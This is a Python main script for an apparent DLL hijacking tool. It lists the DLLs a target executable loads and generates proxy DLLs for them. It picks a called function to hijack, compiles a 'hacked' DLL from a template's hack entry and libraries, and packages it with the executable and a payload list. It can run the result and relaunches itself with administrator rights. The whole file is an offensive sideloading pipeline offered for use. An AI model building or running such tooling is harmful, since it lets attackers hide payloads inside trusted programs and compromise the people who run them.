import json
import os
import pyuac
import subprocess

from utils.exe_analyzer import scan_exe_functions, behavior_analyze, select_scanned_functions
from utils.dll_finder import get_dlls
from utils.generator import gen_dll, gen_hacked_dll, export_out


def main():
    with open("config.json", "r") as f:
        data = json.load(f)

    dlls = get_dlls(data["exe_path"], data["exe_args"])

    dll_functions = {}
    all_functions = []

    for dll in dlls:
        functions = scan_exe_functions(data["exe_path"], dll)
        if len(functions) > 0:
            for function in functions:
                dll_functions.update({function: dll})
            all_functions += functions
            gen_dll(functions, dll, data["vcvar_bat"])

    called_functions = behavior_analyze(f"./temp/{os.path.basename(data['exe_path'])}", data["exe_args"], all_functions)

    called_dll_functions = {}
    for function in called_functions:
        called_dll_functions.update({function: dll_functions[function]})

    if len(called_dll_functions) > 1:
        hijacked_function, dll = select_scanned_functions(called_dll_functions)
    elif len(called_dll_functions) == 1:
        (hijacked_function, dll) = called_dll_functions.popitem()
    else:
        raise Exception("No functions selected")

    with open(f"{data['template']}/config.json", "r") as f:
        template_config = json.load(f)

    if not data["template"].endswith("/") or data["template"].endswith("\\"):
        data["template"] += "/"

    hack_entry = data["template"] + template_config["hack_entry"]

    hack_lib =  template_config["hack_lib"]
    for i in range(len(hack_lib)):
        hack_lib[i] = data["template"] + hack_lib[i]

    extra_files =  template_config["extra_files"]
    for i in range(len(extra_files)):
        extra_files[i] = data["template"] + extra_files[i]

    functions = []
    for function in dll_functions:
        if dll_functions[function] == dll:
            functions.append(function)
    gen_hacked_dll(functions, dll, hijacked_function, hack_entry, hack_lib, data["vcvar_bat"], os.path.basename(os.path.dirname(data['template'])))

    files = [f"./temp/{os.path.basename(data['exe_path'])}"] + data["payload"]
    export_out(extra_files, files, os.path.basename(os.path.dirname(data['template'])))

    if data["run"]:
        os.chdir("./out")
        p = subprocess.run([f"{os.path.basename(data['exe_path'])}"] + data["exe_args"], capture_output=True, text=True)
        print(p.stdout)

    print(f"Done All!!!!!!!!!")


if __name__ == "__main__":
    if not pyuac.isUserAdmin():
        print("Re-launching as admin!")
        pyuac.runAsAdmin()
        exit()
    try:
        main()
    except Exception:
        import traceback

        traceback.print_exc()
    input("Press enter to end the program......")
